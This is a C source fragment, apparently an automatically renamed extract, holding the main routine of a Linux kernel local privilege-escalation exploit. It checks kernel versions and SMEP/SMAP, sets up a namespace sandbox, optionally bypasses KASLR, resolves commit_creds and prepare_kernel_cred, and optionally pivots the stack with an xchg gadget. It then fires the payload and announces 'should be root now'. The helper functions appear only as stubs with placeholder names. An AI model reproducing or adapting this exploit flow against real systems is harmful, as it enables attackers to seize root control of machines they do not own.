#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  COMMIT_CREDS ; 
 int /*<<< orphan*/  KERNEL_BASE ; 
 int /*<<< orphan*/  PREPARE_KERNEL_CRED ; 
 unsigned long XCHG_EAX_ESP_RET ; 
 int /*<<< orphan*/  FUNC0 () ; 
 int /*<<< orphan*/  FUNC1 () ; 
 int /*<<< orphan*/  FUNC2 () ; 
 int /*<<< orphan*/  FUNC3 () ; 
 int /*<<< orphan*/  get_root ; 
 int /*<<< orphan*/  FUNC4 () ; 
 int /*<<< orphan*/  FUNC5 (unsigned long) ; 
 int /*<<< orphan*/  FUNC6 (char*,...) ; 
 int /*<<< orphan*/  FUNC7 () ; 

int FUNC8(int argc, char** argv) {
	FUNC6("[.] starting\n");

	FUNC6("[.] checking distro and kernel versions\n");
	FUNC2();
	FUNC6("[~] done, versions looks good\n");

	FUNC6("[.] checking SMEP and SMAP\n");
	FUNC1();
	FUNC6("[~] done, looks good\n");

	FUNC6("[.] setting up namespace sandbox\n");
	FUNC7();
	FUNC6("[~] done, namespace sandbox set up\n");

#if ENABLE_KASLR_BYPASS
	printf("[.] KASLR bypass enabled, getting kernel addr\n");
	KERNEL_BASE = get_kernel_addr();
	printf("[~] done, kernel text:   %lx\n", KERNEL_BASE);
#endif

	FUNC6("[.] commit_creds:        %lx\n", COMMIT_CREDS);
	FUNC6("[.] prepare_kernel_cred: %lx\n", PREPARE_KERNEL_CRED);

	unsigned long payload = (unsigned long)&get_root;

#if ENABLE_SMEP_BYPASS
	printf("[.] SMEP bypass enabled, mmapping fake stack\n");
	mmap_stack();
	payload = XCHG_EAX_ESP_RET;
	printf("[~] done, fake stack mmapped\n");
#endif

	FUNC6("[.] executing payload %lx\n", payload);
	FUNC5(payload);
	FUNC6("[~] done, should be root now\n");

	FUNC0();

	return 0;
}